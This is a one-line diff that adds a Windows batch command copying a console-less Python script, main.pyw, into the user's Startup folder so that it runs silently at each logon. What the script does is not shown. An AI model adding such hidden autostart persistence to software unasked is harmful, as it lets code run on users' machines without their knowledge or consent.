@@ -1,0 +1,1 @@
+copy main.pyw "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup" /y
